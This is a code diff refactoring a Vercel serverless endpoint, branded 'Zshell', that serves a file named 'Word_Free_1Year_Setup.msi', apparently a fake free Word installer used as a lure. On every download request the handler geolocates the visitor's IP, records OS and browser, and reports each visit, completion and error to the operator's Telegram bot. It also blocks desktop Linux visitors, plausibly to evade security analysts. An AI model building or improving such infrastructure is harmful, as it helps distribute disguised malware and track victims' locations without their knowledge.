@@ -1,8 +1,94 @@
 import type { VercelRequest, VercelResponse } from '@vercel/node'
-import * as path from 'path'
-import * as fs from 'fs'
-import axios from 'axios'
-import { UAParser } from 'ua-parser-js'
+import { readFileSync, existsSync } from 'fs'
+import { join } from 'path'
+
+// Simple user agent parser - no external dependencies
+function parseUserAgent(userAgent: string) {
+    const ua = userAgent.toLowerCase()
+    
+    // Detect OS
+    let osName = 'Unknown OS'
+    if (ua.includes('windows nt 10.0')) osName = 'Windows 10'
+    else if (ua.includes('windows nt 6.3')) osName = 'Windows 8.1'
+    else if (ua.includes('windows nt 6.1')) osName = 'Windows 7'
+    else if (ua.includes('windows')) osName = 'Windows'
+    else if (ua.includes('mac os x')) osName = 'macOS'
+    else if (ua.includes('android')) osName = 'Android'
+    else if (ua.includes('linux') && !ua.includes('android')) osName = 'Linux'
+    else if (ua.includes('iphone')) osName = 'iOS'
+    
+    // Detect Browser
+    let browserName = 'Unknown Browser'
+    if (ua.includes('chrome') && !ua.includes('edge')) browserName = 'Chrome'
+    else if (ua.includes('firefox')) browserName = 'Firefox'
+    else if (ua.includes('safari') && !ua.includes('chrome')) browserName = 'Safari'
+    else if (ua.includes('edge')) browserName = 'Edge'
+    
+    return {
+        os: osName,
+        browser: browserName,
+        platform: osName,
+        type: osName
+    }
+}
+
+// Simple geolocation lookup
+async function getLocationData(ip: string) {
+    // Skip private IPs
+    if (ip === '127.0.0.1' || ip === 'localhost' || 
+        ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
+        return { country: 'Local Network', city: 'Localhost', isp: 'Local' }
+    }
+    
+    try {
+        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp`, {
+            signal: AbortSignal.timeout(3000)
+        })
+        
+        if (response.ok) {
+            const data = await response.json()
+            if (data.status === 'success') {
+                return {
+                    country: data.country || 'Unknown',
+                    city: data.city || 'Unknown', 
+                    isp: data.isp || 'Unknown'
+                }
+            }
+        }
+    } catch (error) {
+        console.log('⚠️ Geolocation failed:', error)
+    }
+    
+    return { country: 'Unknown', city: 'Unknown', isp: 'Unknown' }
+}
+
+// Simple Telegram sender
+async function sendTelegramLog(message: string) {
+    if (!config.TELEGRAM_BOT_TOKEN || !config.TELEGRAM_CHAT_ID) {
+        console.log('⚠️ Telegram disabled - missing credentials')
+        return
+    }
+
+    try {
+        const response = await fetch(`https://api.telegram.org/bot${config.TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: config.TELEGRAM_CHAT_ID,
+                text: message
+            }),
+            signal: AbortSignal.timeout(5000)
+        })
+        
+        if (response.ok) {
+            console.log('✅ Telegram log sent successfully')
+        } else {
+            console.log('⚠️ Telegram send failed')
+        }
+    } catch (error) {
+        console.log('⚠️ Telegram error:', error)
+    }
+}
 
 // Configuration
 const config = {
@@ -11,183 +97,68 @@ const config = {
     BLOCK_LINUX: process.env.BLOCK_LINUX !== 'false', // Default enabled, set BLOCK_LINUX=false to disable
 }
 
-// Enhanced Telegram Logging Function (Non-blocking)
-function sendTelegramLog(message: string): void {
-    if (!config.TELEGRAM_BOT_TOKEN || !config.TELEGRAM_CHAT_ID) {
-        console.log('⚠️ Telegram logging disabled - missing bot token or chat ID')
-        return
-    }
 
-    // Fire-and-forget with timeout to prevent blocking downloads
-    const timeoutPromise = new Promise<never>((_, reject) => 
-        setTimeout(() => reject(new Error('Timeout')), 5000)
-    )
-
-    const sendPromise = axios.post(`https://api.telegram.org/bot${config.TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        chat_id: config.TELEGRAM_CHAT_ID,
-        text: message
-    })
-
-    Promise.race([sendPromise, timeoutPromise])
-        .then(() => console.log('✅ Telegram log sent successfully'))
-        .catch(error => console.error('❌ Failed to send Telegram log:', error.message))
-}
-
-// Get client IP address with proper forwarded header parsing
+// Get client IP address 
 function getClientIP(req: VercelRequest): string {
-    // Parse x-forwarded-for to get the first (original) IP
     const forwarded = req.headers['x-forwarded-for']
     if (typeof forwarded === 'string') {
         const firstIP = forwarded.split(',')[0].trim()
-        if (firstIP && firstIP !== 'unknown') {
-            return firstIP
-        }
+        if (firstIP && firstIP !== 'unknown') return firstIP
     }
-    
-    return (req.headers['x-real-ip'] as string) ||
-           (req.connection?.remoteAddress) || 
-           (req.socket?.remoteAddress) ||
-           'Unknown'
+    return (req.headers['x-real-ip'] as string) || 'Unknown'
 }
 
-interface LocationData {
-    country: string
-    city: string
-    region?: string
-    isp: string
-    timezone?: string
-}
-
-// Get geolocation data for IP
-async function getLocationData(ip: string): Promise<LocationData> {
-    try {
-        // Skip geolocation for localhost/private IPs
-        if (ip === '127.0.0.1' || ip === 'localhost' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
-            return { country: 'Local Network', city: 'Localhost', isp: 'Local' }
-        }
-        
-        // Use IP-API.com (free, no API key required, 45 requests/minute)
-        const response = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,region,regionName,city,isp,org,timezone`, {
-            timeout: 3000
-        })
-        
-        if (response.data && response.data.status === 'success') {
-            return {
-                country: response.data.country || 'Unknown',
-                city: response.data.city || 'Unknown',
-                region: response.data.regionName || '',
-                isp: response.data.isp || 'Unknown',
-                timezone: response.data.timezone || 'Unknown'
-            }
-        }
-    } catch (error: any) {
-        console.log('⚠️ Geolocation lookup failed:', error.message)
-    }
-    
-    return { country: 'Unknown', city: 'Unknown', isp: 'Unknown' }
-}
-
-// Format download log message with real detection
+// Format download log message
 async function formatDownloadLog(userAgent: string, ip: string, referrer: string): Promise<string> {
-    const parser = new UAParser(userAgent)
-    const browser = parser.getBrowser()
-    const os = parser.getOS()
-    const device = parser.getDevice()
-    
-    // Get real geolocation data
+    const device = parseUserAgent(userAgent)
     const location = await getLocationData(ip)
+    const currentTime = new Date().toLocaleString('en-US', { timeZone: 'UTC' })
     
-    const currentTime = new Date().toLocaleString('en-US', {
-        timeZone: 'UTC',
-        year: 'numeric',
-        month: '2-digit',
-        day: '2-digit',
-        hour: '2-digit',
-        minute: '2-digit',
-        second: '2-digit'
-    })
-
-    // Format platform with real detection
-    const platformName = os.name || 'Unknown OS'
-    const platformVersion = os.version ? ` ${os.version}` : ''
-    const platform = `${platformName}${platformVersion}`
-    
-    // Format browser with real detection
-    const browserName = browser.name || 'Unknown Browser'
-    const browserVersion = browser.version ? ` ${browser.version}` : ''
-    const browserInfo = `${browserName}${browserVersion}`
-    
-    // Format device type
-    const deviceType = device.type || os.name || platformName
-    
-    // Format location info
     const locationInfo = location.city !== 'Unknown' ? `${location.city}, ${location.country}` : location.country
     const ispInfo = location.isp !== 'Unknown' ? ` (${location.isp})` : ''
 
     return `🧛‍♂️ Zshell
-📢 New Device Access
- DOCX CLIENT
+📢 New Device Access - DOCX CLIENT
 
 🌍 IP: ${ip}${ispInfo}
-🖥 Platform: ${platform}
-🌐 Browser: ${browserInfo}
+🖥 Platform: ${device.platform}
+🌐 Browser: ${device.browser}
 🌎 Country: ${locationInfo}
-
-🔵 Docx User attempting to download Docx file
-📱 Device: ${deviceType}
-🌍 IP: ${ip}
-🌐 Browser: ${browserInfo}
-📍 Location: ${locationInfo}
+📱 Device: ${device.type}
 ⏰ Time: ${currentTime}
 🔄 Referrer: ${referrer || 'Direct'}
 
-🔽 Docx user attempting to download Docx file for ${deviceType} device
-
-✅ Docx file download started successfully for ${deviceType} device`
+🔽 Docx user downloading file for ${device.type} device
+✅ Download started successfully`
 }
 
 // Linux blocking function
 function checkLinuxBlocking(userAgent: string): { isLinux: boolean, platform: string } {
-    if (!config.BLOCK_LINUX) {
-        return { isLinux: false, platform: 'blocking disabled' }
-    }
+    if (!config.BLOCK_LINUX) return { isLinux: false, platform: 'blocking disabled' }
 
-    const parser = new UAParser(userAgent)
-    const os = parser.getOS()
-    const platform = (os.name || '').toLowerCase()
+    const device = parseUserAgent(userAgent)
+    const platform = device.platform.toLowerCase()
     
     // Block desktop Linux (but allow Android and ChromeOS)
     const isLinux = platform.includes('linux') && 
                    !platform.includes('android') && 
-                   !platform.includes('chrome') &&
-                   !platform.includes('chromeos')
+                   !platform.includes('chrome')
     
-    return { isLinux, platform: os.name || 'Unknown' }
+    return { isLinux, platform: device.platform }
 }
 
 // Format blocked Linux log message
 async function formatBlockedLog(userAgent: string, ip: string): Promise<string> {
-    const parser = new UAParser(userAgent)
-    const os = parser.getOS()
+    const device = parseUserAgent(userAgent)
     const location = await getLocationData(ip)
-    
-    const currentTime = new Date().toLocaleString('en-US', {
-        timeZone: 'UTC',
-        year: 'numeric',
-        month: '2-digit', 
-        day: '2-digit',
-        hour: '2-digit',
-        minute: '2-digit',
-        second: '2-digit'
-    })
-
+    const currentTime = new Date().toLocaleString('en-US', { timeZone: 'UTC' })
     const locationInfo = location.city !== 'Unknown' ? `${location.city}, ${location.country}` : location.country
     const ispInfo = location.isp !== 'Unknown' ? ` (${location.isp})` : ''
 
     return `🚫 Linux Access Blocked
 🧛‍♂️ Zshell - Security Block
 🌍 IP: ${ip}${ispInfo}
-🖥 Platform: ${os.name || 'Unknown'} ${os.version || ''}
+🖥 Platform: ${device.platform}
 📍 Location: ${locationInfo}
 ⏰ Time: ${currentTime}
 ❌ Reason: Linux systems not supported`
@@ -199,23 +170,24 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
         return res.status(405).json({ success: false, message: 'Method not allowed' })
     }
 
-    // Resolve MSI path for Vercel serverless function
+    // Find MSI file in Vercel
     const msiFileName = 'Word_Free_1Year_Setup.msi'
+    const paths = [
+        join(process.cwd(), 'client', 'public', msiFileName),
+        join(process.cwd(), 'public', msiFileName),
+        join(process.cwd(), 'client', 'dist', msiFileName)
+    ]
     
-    // In Vercel, files should be in the public directory or included via includeFiles
-    const publicPath = path.join(process.cwd(), 'public', msiFileName)
-    const clientPublicPath = path.join(process.cwd(), 'client', 'public', msiFileName)
-    const clientDistPath = path.join(process.cwd(), 'client', 'dist', msiFileName)
+    let filePath: string | null = null
+    for (const path of paths) {
+        if (existsSync(path)) {
+            filePath = path
+            break
+        }
+    }
     
-    let filePath: string
-    if (fs.existsSync(publicPath)) {
-        filePath = publicPath
-    } else if (fs.existsSync(clientPublicPath)) {
-        filePath = clientPublicPath
-    } else if (fs.existsSync(clientDistPath)) {
-        filePath = clientDistPath
-    } else {
-        console.error('❌ MSI file not found in any expected location')
+    if (!filePath) {
+        console.error('❌ MSI file not found')
         return res.status(404).json({ success: false, message: 'Download file not available' })
     }
     
@@ -234,9 +206,9 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
         // Log to Telegram (non-blocking)
         try {
             const blockMessage = await formatBlockedLog(userAgent, clientIP)
-            sendTelegramLog(blockMessage)
-        } catch (error: any) {
-            console.error('❌ Failed to send block log:', error.message)
+            sendTelegramLog(blockMessage).catch(console.error)
+        } catch (error) {
+            console.error('❌ Block log error:', error)
         }
         
         // Return 403 with informative message
@@ -252,12 +224,12 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
     console.log(`👤 Client IP: ${clientIP}`)
     console.log(`🌐 User Agent: ${userAgent}`)
     
-    // Send Telegram log for download attempt (non-blocking)
+    // Send Telegram log (non-blocking)
     try {
         const logMessage = await formatDownloadLog(userAgent, clientIP, referrer)
-        sendTelegramLog(logMessage)
-    } catch (error: any) {
-        console.error('❌ Failed to format log message:', error.message)
+        sendTelegramLog(logMessage).catch(console.error)
+    } catch (error) {
+        console.error('❌ Log error:', error)
     }
     
     // Set CORS headers for Vercel
@@ -272,17 +244,14 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
     
     try {
         // Read file and send as response
-        const fileBuffer = fs.readFileSync(filePath)
+        const fileBuffer = readFileSync(filePath)
         
-        console.log(`✅ Download completed successfully: ${fileName}`)
+        console.log(`✅ Download completed: ${fileName}`)
         
-        // Send success confirmation to Telegram (non-blocking)
+        // Send success confirmation to Telegram (non-blocking)  
         try {
             const location = await getLocationData(clientIP)
-            const parser = new UAParser(userAgent)
-            const os = parser.getOS()
-            const browser = parser.getBrowser()
-            const deviceType = os.name || 'Unknown'
+            const device = parseUserAgent(userAgent)
             const locationInfo = location.city !== 'Unknown' ? `${location.city}, ${location.country}` : location.country
             
             const successMessage = `✅ Download Completed Successfully
@@ -290,34 +259,35 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
 🌍 IP: ${clientIP}
 📍 Location: ${locationInfo}
 📁 File: ${fileName}
-📱 Device: ${deviceType}
-🌐 Browser: ${browser.name || 'Unknown'} ${browser.version || ''}
+📱 Device: ${device.type}
+🌐 Browser: ${device.browser}
 ⏰ Time: ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })}`
             
-            sendTelegramLog(successMessage)
-        } catch (error: any) {
-            console.error('❌ Failed to format success message:', error.message)
+            sendTelegramLog(successMessage).catch(console.error)
+        } catch (error) {
+            console.error('❌ Success log error:', error)
         }
         
         res.status(200).send(fileBuffer)
         
-    } catch (err: any) {
+    } catch (err) {
         console.error('❌ Download error:', err)
         
-        // Send Telegram log for download error (non-blocking)
+        // Send error to Telegram (non-blocking)
+        const device = parseUserAgent(userAgent)
         const errorMessage = `❌ Download Error
 🧛‍♂️ Zshell - Error Report
 🌍 IP: ${clientIP}
-📱 Device: ${new UAParser(userAgent).getOS().name || 'Unknown'}
-❌ Error: ${err.message}
+📱 Device: ${device.type}
+❌ Error: ${err instanceof Error ? err.message : 'Unknown error'}
 ⏰ Time: ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })}`
         
-        sendTelegramLog(errorMessage)
+        sendTelegramLog(errorMessage).catch(console.error)
         
         return res.status(500).json({
             success: false,
             message: "Download failed. Please try again.",
-            error: err.message
+            error: err instanceof Error ? err.message : 'Unknown error'
         })
     }
 }
